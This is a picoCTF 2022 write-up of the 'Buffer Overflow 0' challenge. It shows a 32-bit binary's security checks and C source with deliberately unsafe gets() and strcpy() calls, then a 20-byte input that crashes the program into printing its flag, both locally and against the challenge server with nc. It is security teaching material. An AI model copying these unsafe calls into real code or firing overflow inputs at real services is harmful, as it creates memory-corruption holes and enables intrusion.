---
title: picoCTF 2022 - Buffer Overflow 0
tags: [pico22, bof, pwn]
---

Let's gather some information before attempting to execute the binary

```bash
$ file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=08fef67fdcc0d93019a26a2f8f97279dee848031, for GNU/Linux 3.2.0, not stripped

$ pwn checksec vuln
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We can see that it's a 32 bit ELF file dinamically linked and not stripped. If we attempt to execute it, we are prompted for a text file named `flag.txt`. Let's create it and run the binary again.

```bash
$ echo "Buffer Overflow HERE" >> flag.txt

$ ./vuln
Input: zanef
The program will exit now
```

Nothing strange happens. We check the source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

There's only one function that should stands out and it's `sigsegv_handler()`. This function receives an integer and prints out the flag. We can see that in this line `sigsegv_handler()` is passed as an argument to another function named `signal()`

```c
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```

With a simple online search we can read that `signal()` _"sets a function to handle signal i.e. a signal handler with signal numer sig"_ and `SIGSEV` is _"a signal propagated when a program tries to read or write outside the memory it is allocated for it"_. With these two definitions we can deduce that this program, when there's an invalid storage read or write, calls the handler that prints the flag.

We have to write or read outside the program boundaries. Check the source code again and we can see that the function `vuln()` uses `strcpy()` to copy the input string into a buffer. `strcpy()` is a function vulnerable to buffer overflow so if we pass an input larger than the buffer that sould contain it, `strcpy()` will try to write it anyway and will overwrite the memory addresses after the limits.

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

We can see that in the `main()` function it's used `gets()` that is another buffer overflow vulnerable function.

```c
char buf1[100];
  gets(buf1);
```

Let's exploit `strcpy()` by feeding the program with inputs longer than 16 bytes.

```bash
$ python -c 'print "A" * 16' | ./vuln
Input: The program will exit now

$ python -c 'print "A" * 20' | ./vuln
Input: Buffer Overflow HERE
``` 

With an input of 20 bytes the program prints out the content of our `flag.txt` file. This means that the program tried to write outside its boundaries and generated a segmentation fault signal. We can confirm our assumption with this command

```bash
$ sudo dmesg
segfault at 0 ip 00007fc88e67c375 sp 00007ffec5897fd8 error 4 in libc-2.33.so[7fc88e52e000+158000] 
```

We can now exploit the remote service and get some points

```bash
$ python -c 'print "A" * 20' | nc saturn.picoctf.net 65355
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_[redacted]}
```